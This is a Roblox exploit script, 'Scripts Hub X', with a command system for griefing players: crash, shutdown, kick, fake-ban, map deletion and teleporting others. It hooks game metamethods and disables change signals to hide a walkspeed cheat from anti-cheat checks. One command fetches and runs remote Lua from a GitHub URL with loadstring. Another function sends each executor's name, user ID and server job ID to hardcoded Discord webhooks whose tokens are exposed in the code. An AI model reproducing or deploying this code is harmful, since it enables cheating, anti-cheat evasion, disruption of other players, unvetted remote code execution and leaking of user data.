-- ================================
-- Scripts Hub X | Enhanced Command System with Tester System
-- ALL commands support targets, apply to self if no target
-- ================================
local Keysystem = false

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"4196292931", -- jvpogi233jj
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
    "716599904", -- ImRottingInHell [PERM]
    "229691", -- ravyn [PERM]
    "4196292931", -- jvpogi233jj [TRIAL<2025-10-27>]
}

local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
local commandLogWebhook = "https://discord.com/api/webhooks/1428332314555056158/pl2NgTWs4vO8SvOemdr1B7aIk4Tn9aVIqrU1NCImBBdloO_FKQL2fN2tEgrosks0LZEI"

-- System Variables
local isPremiumUser = false
local helpGui = nil
local jailPart = nil

-- ================================
-- HELPER FUNCTIONS
-- ================================
local function isPremiumUserId(userId)
	local userIdStr = tostring(userId)
	
	if userIdStr == tostring(OwnerUserId) then
		return true, "owner"
	end
	
	if table.find(StaffUserId, userIdStr) then
		return true, "staff"
	end
	
	if table.find(PremiumUsers, userIdStr) then
		return true, "premium"
	end
	
	return false, "regular"
end

local function notify(title, text, duration)
	spawn(function()
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3 or duration
			})
		end)
	end)
end

local function sendCommandLog(commandName, executorPlayer, targetPlayer, extraInfo)
	task.spawn(function()
		pcall(function()
			local gameName = "Unknown"
			local success, productInfo = pcall(function()
				return MarketplaceService:GetProductInfo(game.PlaceId)
			end)
			if success and productInfo and productInfo.Name then
				gameName = productInfo.Name
			end
			
			local _, userType = isPremiumUserId(executorPlayer.UserId)
			
			local targetInfo = "Self"
			if targetPlayer and targetPlayer ~= executorPlayer then
				targetInfo = targetPlayer.Name .. " (@" .. targetPlayer.DisplayName .. ")"
			end
			
			local send_data = {
				["username"] = "SHX Command Logger",
				["avatar_url"] = "https://nervous-purple-tc7szd5sj5.edgeone.app/file_0000000092fc61f590999584d90cd9f7.png",
				["content"] = "Command Executed!",
				["embeds"] = {
					{
						["title"] = "🎮 Command Execution Log",
						["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Job ID**: " .. game.JobId,
						["color"] = 3447003,
						["fields"] = {
							{["name"] = "Command", ["value"] = "```" .. commandName .. "```", ["inline"] = false},
							{["name"] = "Executor", ["value"] = executorPlayer.Name .. " (@" .. executorPlayer.DisplayName .. ")", ["inline"] = true},
							{["name"] = "Executor ID", ["value"] = tostring(executorPlayer.UserId), ["inline"] = true},
							{["name"] = "User Type", ["value"] = userType:upper(), ["inline"] = true},
							{["name"] = "Target", ["value"] = targetInfo, ["inline"] = true},
							{["name"] = "Target ID", ["value"] = targetPlayer and tostring(targetPlayer.UserId) or "N/A", ["inline"] = true},
							{["name"] = "Extra Info", ["value"] = extraInfo or "None", ["inline"] = true}
						},
						["footer"] = {["text"] = "Scripts Hub X | Command Logger", ["icon_url"] = "https://nervous-purple-tc7szd5sj5.edgeone.app/file_0000000092fc61f590999584d90cd9f7.png"},
						["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. executorPlayer.UserId .. "&size=420x420&format=Png&isCircular=true"},
						["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
					}
				}
			}
			
			local headers = {["Content-Type"] = "application/json"}
			local function makeWebhookRequest()
				if request and type(request) == "function" then
					request({
						Url = commandLogWebhook,
						Method = "POST",
						Headers = headers,
						Body = HttpService:JSONEncode(send_data)
					})
				elseif http_request and type(http_request) == "function" then
					http_request({
						Url = commandLogWebhook,
						Method = "POST",
						Headers = headers,
						Body = HttpService:JSONEncode(send_data)
					})
				elseif syn and syn.request then
					syn.request({
						Url = commandLogWebhook,
						Method = "POST",
						Headers = headers,
						Body = HttpService:JSONEncode(send_data)
					})
				end
			end
			
			makeWebhookRequest()
		end)
	end)
end

-- ================================
-- HELP GUI SYSTEM
-- ================================

local commandsList = {
	{cmd = ";help", desc = "Shows this help menu", example = ";help", category = "Info"},
	{cmd = ";kick [user]", desc = "Kicks target or self from game (alias: ;kk)", example = ";kk OR ;kk username", category = "Player"},
	{cmd = ";kill [user]", desc = "Kills target or self (alias: ;k)", example = ";k OR ;k username", category = "Player"},
	{cmd = ";jail [user]", desc = "Makes target or self jump (alias: ;j)", example = ";j OR ;j username", category = "Player"},
	{cmd = ";trip [user]", desc = "Makes target or self trip/sit (alias: ;t)", example = ";t OR ;t username", category = "Player"},
	{cmd = ";void [user]", desc = "Sends target or self to void (alias: ;v)", example = ";v OR ;v username", category = "Player"},
	{cmd = ";freeze [user]", desc = "Freezes target or self (alias: ;f)", example = ";f OR ;f username", category = "Player"},
	{cmd = ";unfreeze [user]", desc = "Unfreezes target or self (alias: ;uf)", example = ";uf OR ;uf username", category = "Player"},
	{cmd = ";funny [user]", desc = "Teleports target or self to 100k studs (alias: ;fun)", example = ";fun OR ;fun username", category = "Player"},
	{cmd = ";jail [user]", desc = "Jails target or self in cage (alias: ;j)", example = ";jail OR ;jail username", category = "Player"},
	{cmd = ";unjail [user]", desc = "Removes jail from target or self (alias: ;uj)", example = ";uj OR ;uj username", category = "Player"},
	{cmd = ";jumpscare [user]", desc = "Jumpscares target or self (alias: ;js)", example = ";jumpscare OR ;js username", category = "Fun"},
	{cmd = ";crash [user]", desc = "Crashes target or self's game (alias: ;c)", example = ";c OR ;c username", category = "Destructive"},
	{cmd = ";byfron [user]", desc = "Deletes all GUIs for target or self (alias: ;by)", example = ";by OR ;by username", category = "Destructive"},
	{cmd = ";shutdown [user]", desc = "Shuts down target or self's game (alias: ;sd)", example = ";sd OR ;sd username", category = "Destructive"},
	{cmd = ";deletemap [user]", desc = "Deletes map for target or self (alias: ;dm)", example = ";dm OR ;dm username", category = "Server"},
	{cmd = ";gravity [user] [value]", desc = "Changes gravity (alias: ;g)", example = ";g username 50 OR ;g 50", category = "Server"},
	{cmd = ";framerate [user] [fps]", desc = "Sets FPS cap (alias: ;fr)", example = ";fr username 30 OR ;fr 30", category = "Client"},
	{cmd = ";strawhat [user]", desc = "Changes skybox to Strawhat theme (alias: ;sh)", example = ";sh OR ;sh username", category = "Visual"},
	{cmd = ";scriptshubx [user]", desc = "Changes skybox to SHX theme (alias: ;shx)", example = ";shx OR ;shx username", category = "Visual"},
	{cmd = ";tp [user]", desc = "Teleport self to target player", example = ";tp username", category = "Player"},
    {cmd = ";tphere [user]", desc = "Teleport target to you (target must be you)", example = ";tphere username", category = "Player"},
    {cmd = ";speed [user] [value]", desc = "Set walkspeed for target or self (alias: ;s)", example = ";s username 100 OR ;s 100", category = "Player"},
    {cmd = ";speedreset [user]", desc = "Reset walkspeed to default (alias: ;sr)", example = ";sr username OR ;sr", category = "Player"},
	{cmd = ";explode [user]", desc = "Explodes target or self (alias: ;ex)", example = ";ex OR ;ex username", category = "Destructive"},
	{cmd = ";floatspin [user]", desc = "Floats and spins target or self (alias: ;fs)", example = ";fs OR ;fs username", category = "Player"},
	{cmd = ";unfloatspin [user]", desc = "Stops floatspin (alias: ;ufs)", example = ";ufs OR ;ufs username", category = "Player"},
    {cmd = ";panic [user]", desc = "Panics target or self (alias: ;p)", example = ";p OR ;p username", category = "Fun"},
    {cmd = ";fakeban [user]", desc = "Fake ban target or self (alias: ;fb)", example = ";fb OR ;fb username", category = "Destructive"},
    {cmd = ";shakecam [user]", desc = "Shakes camera aggressively for 1 sec (alias: ;sc)", example = ";sc OR ;sc username", category = "Fun"},
}

local function createHelpGui()
	if helpGui then
		helpGui:Destroy()
	end
	
	helpGui = Instance.new("ScreenGui")
	helpGui.Name = "🌐"
	helpGui.ResetOnSpawn = false
	helpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "🌐"
	mainFrame.Size = UDim2.new(0, 450, 0, 550)
	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
	mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = helpGui
	
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = mainFrame
	
	local header = Instance.new("Frame")
	header.Name = "🌐"
	header.Size = UDim2.new(1, 0, 0, 50)
	header.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
	header.BorderSizePixel = 0
	header.Parent = mainFrame
	
	local headerCorner = Instance.new("UICorner")
	headerCorner.CornerRadius = UDim.new(0, 12)
	headerCorner.Parent = header
	
	local title = Instance.new("TextLabel")
	title.Name = "🌐"
	title.Size = UDim2.new(1, -60, 1, 0)
	title.Position = UDim2.new(0, 15, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "Scripts Hub X - Commands"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Font = Enum.Font.GothamBold
	title.Parent = header
	
	local closeButton = Instance.new("TextButton")
	closeButton.Name = "🌐"
	closeButton.Size = UDim2.new(0, 40, 0, 40)
	closeButton.Position = UDim2.new(1, -45, 0, 5)
	closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	closeButton.Text = "×"
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 24
	closeButton.Font = Enum.Font.GothamBold
	closeButton.BorderSizePixel = 0
	closeButton.Parent = header
	
	local closeCorner = Instance.new("UICorner")
	closeCorner.CornerRadius = UDim.new(0, 8)
	closeCorner.Parent = closeButton
	
	closeButton.MouseButton1Click:Connect(function()
		helpGui:Destroy()
		helpGui = nil
	end)
	
	local infoLabel = Instance.new("TextLabel")
	infoLabel.Name = "🌐"
	infoLabel.Size = UDim2.new(1, -30, 0, 50)
	infoLabel.Position = UDim2.new(0, 15, 0, 55)
	infoLabel.BackgroundTransparency = 1
	infoLabel.Text = "✓ All commands support Username and Display Name\n✓ No target = applies to self\n✓ With target = applies to target player"
	infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	infoLabel.TextSize = 12
	infoLabel.TextWrapped = true
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left
	infoLabel.TextYAlignment = Enum.TextYAlignment.Top
	infoLabel.Font = Enum.Font.Gotham
	infoLabel.Parent = mainFrame
	
	local scrollFrame = Instance.new("ScrollingFrame")
	scrollFrame.Name = "🌐"
	scrollFrame.Size = UDim2.new(1, -20, 1, -120)
	scrollFrame.Position = UDim2.new(0, 10, 0, 110)
	scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
	scrollFrame.BorderSizePixel = 0
	scrollFrame.ScrollBarThickness = 6
	scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
	scrollFrame.Parent = mainFrame
	
	local scrollCorner = Instance.new("UICorner")
	scrollCorner.CornerRadius = UDim.new(0, 8)
	scrollCorner.Parent = scrollFrame
	
	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 8)
	layout.Parent = scrollFrame
	
	local padding = Instance.new("UIPadding")
	padding.PaddingTop = UDim.new(0, 8)
	padding.PaddingBottom = UDim.new(0, 8)
	padding.PaddingLeft = UDim.new(0, 8)
	padding.PaddingRight = UDim.new(0, 8)
	padding.Parent = scrollFrame
	
	local currentCategory = ""
	for _, cmdData in ipairs(commandsList) do
		if cmdData.category ~= currentCategory then
			currentCategory = cmdData.category
			local categoryLabel = Instance.new("TextLabel")
			categoryLabel.Name = "Category_" .. currentCategory
			categoryLabel.Size = UDim2.new(1, -16, 0, 25)
			categoryLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
			categoryLabel.BorderSizePixel = 0
			categoryLabel.Text = "  " .. currentCategory
			categoryLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
			categoryLabel.TextSize = 14
			categoryLabel.Font = Enum.Font.GothamBold
			categoryLabel.TextXAlignment = Enum.TextXAlignment.Left
			categoryLabel.Parent = scrollFrame
			
			local catCorner = Instance.new("UICorner")
			catCorner.CornerRadius = UDim.new(0, 6)
			catCorner.Parent = categoryLabel
		end
		
		local cmdFrame = Instance.new("Frame")
		cmdFrame.Name = "🌐"
		cmdFrame.Size = UDim2.new(1, -16, 0, 70)
		cmdFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
		cmdFrame.BorderSizePixel = 0
		cmdFrame.Parent = scrollFrame
		
		local cmdCorner = Instance.new("UICorner")
		cmdCorner.CornerRadius = UDim.new(0, 6)
		cmdCorner.Parent = cmdFrame
		
		local cmdName = Instance.new("TextLabel")
		cmdName.Name = "🌐"
		cmdName.Size = UDim2.new(1, -10, 0, 20)
		cmdName.Position = UDim2.new(0, 5, 0, 5)
		cmdName.BackgroundTransparency = 1
		cmdName.Text = cmdData.cmd
		cmdName.TextColor3 = Color3.fromRGB(100, 255, 150)
		cmdName.TextSize = 13
		cmdName.Font = Enum.Font.GothamBold
		cmdName.TextXAlignment = Enum.TextXAlignment.Left
		cmdName.Parent = cmdFrame
		
		local cmdDesc = Instance.new("TextLabel")
		cmdDesc.Name = "🌐"
		cmdDesc.Size = UDim2.new(1, -10, 0, 20)
		cmdDesc.Position = UDim2.new(0, 5, 0, 25)
		cmdDesc.BackgroundTransparency = 1
		cmdDesc.Text = cmdData.desc
		cmdDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
		cmdDesc.TextSize = 11
		cmdDesc.Font = Enum.Font.Gotham
		cmdDesc.TextXAlignment = Enum.TextXAlignment.Left
		cmdDesc.TextWrapped = true
		cmdDesc.Parent = cmdFrame
		
		local cmdExample = Instance.new("TextLabel")
		cmdExample.Name = "🌐"
		cmdExample.Size = UDim2.new(1, -10, 0, 20)
		cmdExample.Position = UDim2.new(0, 5, 0, 47)
		cmdExample.BackgroundTransparency = 1
		cmdExample.Text = "Example: " .. cmdData.example
		cmdExample.TextColor3 = Color3.fromRGB(150, 150, 170)
		cmdExample.TextSize = 10
		cmdExample.Font = Enum.Font.Gotham
		cmdExample.TextXAlignment = Enum.TextXAlignment.Left
		cmdExample.Parent = cmdFrame
	end
	
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	end)
	
	local dragging, dragInput, dragStart, startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = mainFrame.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	header.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	helpGui.Parent = CoreGui
	
	mainFrame.Position = UDim2.new(0.5, -225, -0.5, 0)
	TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -225, 0.5, -275)
	}):Play()
end

local CommandFunctions = {}
-- ================================
-- WALKSPEED SPOOF SYSTEM
-- ================================
if (not game.PlaceId == 109983668079237 or game.PlaceId == 96342491571673) then
    task.spawn(function()
	    pcall(function()
		    local CommandFunctions = {}
	  	    local cloneref = cloneref or function(...) return ... end
		    local WalkSpeedSpoof = {}
		    local GetDebugIdHandler = Instance.new("BindableFunction")
		    local TempHumanoid = Instance.new("Humanoid")
	        local cachedhumanoids = {}
		    local CurrentHumanoid
		    local newindexhook
		    local indexhook
		
		    function GetDebugIdHandler.OnInvoke(obj) return obj:GetDebugId() end
		    local function GetDebugId(obj) return GetDebugIdHandler:Invoke(obj) end
		    local function GetWalkSpeed(obj)
			    TempHumanoid.WalkSpeed = obj
			    return TempHumanoid.WalkSpeed
		    end
		
		    function cachedhumanoids:cacheHumanoid(DebugId, Humanoid)
			    cachedhumanoids[DebugId] = {
				    currentindex = indexhook(Humanoid, "WalkSpeed"),
				    lastnewindex = nil
			    }
			    return self[DebugId]
		    end
		
		    indexhook = hookmetamethod(game, "__index", function(self, index)
			    if not checkcaller() and typeof(self) == "Instance" then
				    if self:IsA("Humanoid") then
					    local DebugId = GetDebugId(self)
					    local cached = cachedhumanoids[DebugId]
					    if self:IsDescendantOf(player.Character) or cached then
						    if type(index) == "string" then
							    local cleanindex = string.split(index, "\0")[1]
							    if cleanindex == "WalkSpeed" then
								    if not cached then
									    cached = cachedhumanoids:cacheHumanoid(DebugId, self)
								    end
								    if not (CurrentHumanoid and CurrentHumanoid:IsDescendantOf(game)) then
									    CurrentHumanoid = cloneref(self)
								    end
								    return cached.lastnewindex or cached.currentindex
							    end
						    end
					    end
				    end
			    end
			    return indexhook(self, index)
		    end)
		
		    newindexhook = hookmetamethod(game, "__newindex", function(self, index, newindex)
			    if not checkcaller() and typeof(self) == "Instance" then
				    if self:IsA("Humanoid") then
					    local DebugId = GetDebugId(self)
					    local cached = cachedhumanoids[DebugId]
					    if self:IsDescendantOf(player.Character) or cached then
						    if type(index) == "string" then
							    local cleanindex = string.split(index, "\0")[1]
							    if cleanindex == "WalkSpeed" then
								    if not cached then
									    cached = cachedhumanoids:cacheHumanoid(DebugId, self)
								    end
								    if not (CurrentHumanoid and CurrentHumanoid:IsDescendantOf(game)) then
									    CurrentHumanoid = cloneref(self)
								    end
								    cached.lastnewindex = GetWalkSpeed(newindex)
								    return CurrentHumanoid.WalkSpeed
							    end
						    end
					    end
				    end
			    end
			    return newindexhook(self, index, newindex)
		    end)
		
		    function WalkSpeedSpoof:GetHumanoid()
			    return CurrentHumanoid or (function()
				    local char = player.Character
				    local Humanoid = char and char:FindFirstChildWhichIsA("Humanoid") or nil
				    if Humanoid then
					    cachedhumanoids:cacheHumanoid(Humanoid:GetDebugId(), Humanoid)
					    return cloneref(Humanoid)
				    end
			    end)()
		    end
		
		    function WalkSpeedSpoof:SetWalkSpeed(speed)
			    local Humanoid = WalkSpeedSpoof:GetHumanoid()
			    if Humanoid then
				    local connections = {}
				    local function AddConnectionsFromSignal(Signal)
					    for i, v in getconnections(Signal) do
						    if v.State then
							    v:Disable()
							    table.insert(connections, v)
						    end
					    end
				    end
				    AddConnectionsFromSignal(Humanoid.Changed)
				    AddConnectionsFromSignal(Humanoid:GetPropertyChangedSignal("WalkSpeed"))
				    Humanoid.WalkSpeed = speed
				    for i, v in connections do
					    v:Enable()
				    end
			    end
		    end
		
		    function WalkSpeedSpoof:RestoreWalkSpeed()
			    local Humanoid = WalkSpeedSpoof:GetHumanoid()
			    if Humanoid then
				    local cached = cachedhumanoids[Humanoid:GetDebugId()]
				    if cached then
					    WalkSpeedSpoof:SetWalkSpeed(cached.lastnewindex or cached.currentindex)
				    end
			    end
		    end
		
		    getgenv().WalkSpeedSpoof = WalkSpeedSpoof
		    print("[SHX] WalkSpeed spoof system loaded")

		    CommandFunctions.speed = function(args)
	            -- Format: ;speed [target] [value] OR ;speed [value] (self)
	            local speedValue = tonumber(args[3]) or tonumber(args[2]) or 100
	
	            if player.Character and player.Character:FindFirstChild("Humanoid") then
		            -- Use the WalkSpeed spoof method
		            local WalkSpeedSpoof = getgenv().WalkSpeedSpoof
		            if WalkSpeedSpoof then
			            WalkSpeedSpoof:SetWalkSpeed(speedValue)
		            else
			            player.Character.Humanoid.WalkSpeed = speedValue
		            end
		            notify("Scripts Hub X", "Speed set to " .. speedValue)
	            end
            end

            CommandFunctions.s = CommandFunctions.speed -- Alias

			CommandFunctions.speedreset = function(args)
	            if player.Character and player.Character:FindFirstChild("Humanoid") then
		            local WalkSpeedSpoof = getgenv().WalkSpeedSpoof
		            if WalkSpeedSpoof then
			            WalkSpeedSpoof:RestoreWalkSpeed()
		            else
			            player.Character.Humanoid.WalkSpeed = 16
		            end
		            notify("Scripts Hub X", "Speed reset to default")
	            end
            end

CommandFunctions.speedr = CommandFunctions.speedreset -- Alias
CommandFunctions.sr = CommandFunctions.speedreset -- Alias
	    end)
    end)
end

-- ================================
-- COMMAND FUNCTIONS (ALL WORK ON LOCAL PLAYER)
-- ================================
local floatspinConnections = {} -- Track floatspin loops
local panicConnections = {} -- Track panic loops

CommandFunctions.help = function(args)
	createHelpGui()
end

CommandFunctions.kick = function(args)
	local reason = table.concat(args, " ", 2) or "You have been kicked by a Scripts Hub X user"
	player:Kick(reason)
end

CommandFunctions.kk = CommandFunctions.kick -- Alias for kick

CommandFunctions.crash = function(args)
	while true do
		RunService.Heartbeat:Wait()
		for i = 1, 1000 do
			Instance.new("Part", Workspace)
		end
	end
end

CommandFunctions.c = CommandFunctions.crash -- Alias

CommandFunctions.byfron = function(args)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				gui:Destroy()
			end
		end
		for _, gui in pairs(CoreGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				pcall(function() gui:Destroy() end)
			end
		end
	end)
end

CommandFunctions.by = CommandFunctions.byfron -- Alias

CommandFunctions.deletemap = function(args)
	pcall(function()
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj ~= Workspace.CurrentCamera then
				pcall(function() obj:Destroy() end)
			end
		end
	end)
end

CommandFunctions.dm = CommandFunctions.deletemap -- Alias

CommandFunctions.framerate = function(args)
	-- Format: ;framerate [target] [fps] OR ;framerate [fps] (self)
	local fps = tonumber(args[3]) or tonumber(args[2]) or 60
	pcall(function()
		setfpscap(fps)
	end)
	print("[SHX] FPS set to " .. fps)
end

CommandFunctions.fr = CommandFunctions.framerate -- Alias

CommandFunctions.gravity = function(args)
	-- Format: ;gravity [target] [value] OR ;gravity [value] (self)
	local gravityValue = tonumber(args[3]) or tonumber(args[2]) or 196.2
	Workspace.Gravity = gravityValue
	print("[SHX] Gravity set to " .. gravityValue)
end

CommandFunctions.g = CommandFunctions.gravity -- Alias

CommandFunctions.jump = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Jump = true
	end
end

CommandFunctions.j = CommandFunctions.jump -- Alias

CommandFunctions.kill = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Health = 0
	end
end

CommandFunctions.k = CommandFunctions.kill -- Alias

CommandFunctions.shutdown = function(args)
	game:Shutdown()
end

CommandFunctions.sd = CommandFunctions.shutdown -- Alias

CommandFunctions.trip = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Sit = true
	end
end

CommandFunctions.t = CommandFunctions.trip -- Alias

CommandFunctions.void = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
	end
end

CommandFunctions.v = CommandFunctions.void -- Alias

CommandFunctions.strawhat = function(args)
	pcall(function()
		for _, obj in pairs(Lighting:GetChildren()) do
			if obj:IsA("Sky") then
				obj:Destroy()
			end
		end
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://11342821014"
		sky.SkyboxDn = "rbxassetid://11342821014"
		sky.SkyboxFt = "rbxassetid://11342821014"
		sky.SkyboxLf = "rbxassetid://11342821014"
		sky.SkyboxRt = "rbxassetid://11342821014"
		sky.SkyboxUp = "rbxassetid://11342821014"
	end)
end

CommandFunctions.sh = CommandFunctions.strawhat -- Alias

CommandFunctions.scriptshubx = function(args)
	pcall(function()
		for _, obj in pairs(Lighting:GetChildren()) do
			if obj:IsA("Sky") then
				obj:Destroy()
			end
		end
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://74135635728836"
		sky.SkyboxDn = "rbxassetid://74135635728836"
		sky.SkyboxFt = "rbxassetid://74135635728836"
		sky.SkyboxLf = "rbxassetid://74135635728836"
		sky.SkyboxRt = "rbxassetid://74135635728836"
		sky.SkyboxUp = "rbxassetid://74135635728836"
	end)
end

CommandFunctions.shx = CommandFunctions.scriptshubx -- Alias

CommandFunctions.freeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = true
			end
		end
	end
end

CommandFunctions.f = CommandFunctions.freeze -- Alias

CommandFunctions.unfreeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = false
			end
		end
	end
end

CommandFunctions.uf = CommandFunctions.unfreeze -- Alias

CommandFunctions.funny = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100000, 0)
	end
end

CommandFunctions.fun = CommandFunctions.funny -- Alias

CommandFunctions.jail = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		local hrp = player.Character.HumanoidRootPart
		
		if jailPart then
			jailPart:Destroy()
		end
		
		jailPart = Instance.new("Part")
		jailPart.Name = "JailCage_" .. player.Name
		jailPart.Size = Vector3.new(10, 10, 10)
		jailPart.Anchored = true
		jailPart.Transparency = 0.5
		jailPart.CanCollide = true
		jailPart.Material = Enum.Material.Glass
		jailPart.BrickColor = BrickColor.new("Really red")
		jailPart.Parent = Workspace
		jailPart.CFrame = hrp.CFrame
		
		local jailConnection
		jailConnection = RunService.Heartbeat:Connect(function()
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and jailPart and jailPart.Parent then
				local currentPos = player.Character.HumanoidRootPart.Position
				local jailPos = jailPart.Position
				local distance = (currentPos - jailPos).Magnitude
				
				if distance > 3 then
					player.Character.HumanoidRootPart.CFrame = CFrame.new(jailPos)
				end
			else
				if jailConnection then
					jailConnection:Disconnect()
				end
			end
		end)
	end
end

CommandFunctions.uj = function(args)
	if jailPart then
		jailPart:Destroy()
		jailPart = nil
	end
end

CommandFunctions.jumpscare = function(args)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
end

CommandFunctions.js = CommandFunctions.jumpscare -- Alias

CommandFunctions.tp = function(args)
	-- Format: ;tp [target] - teleport LOCAL PLAYER to target
	if args[2] then
		local targetName = args[2]:lower()
		for _, targetPlayer in pairs(Players:GetPlayers()) do
			local targetUserLower = targetPlayer.Name:lower()
			local targetDisplayLower = targetPlayer.DisplayName:lower()
			
			if targetUserLower == targetName or targetDisplayLower == targetName then
				if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and 
				   targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
					player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
					notify("Scripts Hub X", "Teleported to " .. targetPlayer.Name)
				end
				return
			end
		end
		notify("Scripts Hub X", "Player not found")
	else
		notify("Scripts Hub X", "Usage: ;tp [target]")
	end
end

CommandFunctions.tphere = function(args)
	-- Format: ;tphere [target] - teleport target to LOCAL PLAYER
	if args[2] then
		local targetName = args[2]:lower()
		for _, targetPlayer in pairs(Players:GetPlayers()) do
			local targetUserLower = targetPlayer.Name:lower()
			local targetDisplayLower = targetPlayer.DisplayName:lower()
			
			if targetUserLower == targetName or targetDisplayLower == targetName then
				if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and 
				   targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
					targetPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
					notify("Scripts Hub X", targetPlayer.Name .. " teleported to you!")
				end
				return
			end
		end
		notify("Scripts Hub X", "Player not found")
	else
		notify("Scripts Hub X", "Usage: ;tphere [target]")
	end
end

CommandFunctions.explode = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		local hrp = player.Character.HumanoidRootPart
		
		-- Destroy all body parts with explosion effect
		pcall(function()
			local explosion = Instance.new("Explosion")
			explosion.Position = hrp.Position
			explosion.Parent = Workspace
			
			task.wait(0.1)
			player.Character:BreakJoints()
		end)
		
		notify("Scripts Hub X", "Exploded!")
	end
end

CommandFunctions.ex = CommandFunctions.explode -- Alias

